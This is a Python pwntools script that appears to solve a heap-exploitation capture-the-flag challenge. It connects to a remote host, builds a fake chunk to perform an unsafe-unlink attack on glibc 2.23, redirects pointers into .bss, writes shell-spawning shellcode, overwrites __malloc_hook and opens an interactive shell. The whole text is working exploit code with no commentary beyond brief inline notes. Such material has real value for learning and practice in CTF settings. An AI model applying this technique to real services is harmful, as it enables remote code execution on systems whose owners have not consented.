from pwn import *

def add(size, content):
	print r.recvuntil("Your choice :")
	r.sendline('1')
	print r.recvuntil("Size: ")
	r.sendline(size)
	print r.recvuntil("Data: ")
	r.send(content)

def delete(index):
	print r.recvuntil("Your choice :")
	r.sendline('2')
	print r.recvuntil("Index: ")
	r.sendline(index)

def edit(index, size, content):
	print r.recvuntil("Your choice :")
	r.sendline('3')
	print r.recvuntil("Index: ")
	r.sendline(index)
	print r.recvuntil("Size: ")
	r.sendline(size)
	print r.recvuntil("Data: ")
	r.send(content)


r = remote("111.200.241.244", 50635)
context(arch = "amd64", os = 'linux')
elf = ELF("./timu")
libc = ELF("./libc-2.23.so")
malloc_hook = libc.symbols['__malloc_hook']
bss = 0x601020
buf = 0x601040


#	chunk 0 
add(str(0x90), 'a\n')
#	chunk 1
add(str(0x90), 'b\n')
#	fade chunk
#	pre_size, size
payload = p64(0) + p64(0x91) 
#	fd, bk  
payload += p64(buf - 0x18) + p64(buf - 0x10)  
payload += p64(0) * 14
#	change chunk size of 1
payload += p64(0x90) + p64(0xa0)  

edit('0', str(len(payload)), payload)
delete('1')
payload = p64(0) * 3 + p64(bss) + p64(buf) + p64(0) * 3 + p64(0x20)
#	change buf[0] pointer to bss, buf[1] to buf
edit('0', str(len(payload)), payload) 

#	chunk 2
add(str(0x100), 'c\n')
#	chunk 3
add(str(0x100), 'd\n')

delete('2')
payload = p64(0) + p64(buf + 0x8 * 4)
edit('2', str(len(payload)), payload)

#	chunk 4, addr is the same with chunk2
add(str(0x100), 'e\n')

payload = p64(bss) + p64(buf) + p64(0) * 4 + '\x10'
edit('1', str(len(payload)), payload)

shellcode = asm(shellcraft.sh())
edit('0', str(len(shellcode)), shellcode)
#	change malloc hook
edit('6', '8', p64(bss))

print r.recvuntil("Your choice :")
r.sendline('1')
print r.recvuntil("Size: ")
r.sendline('1')

r.interactive()

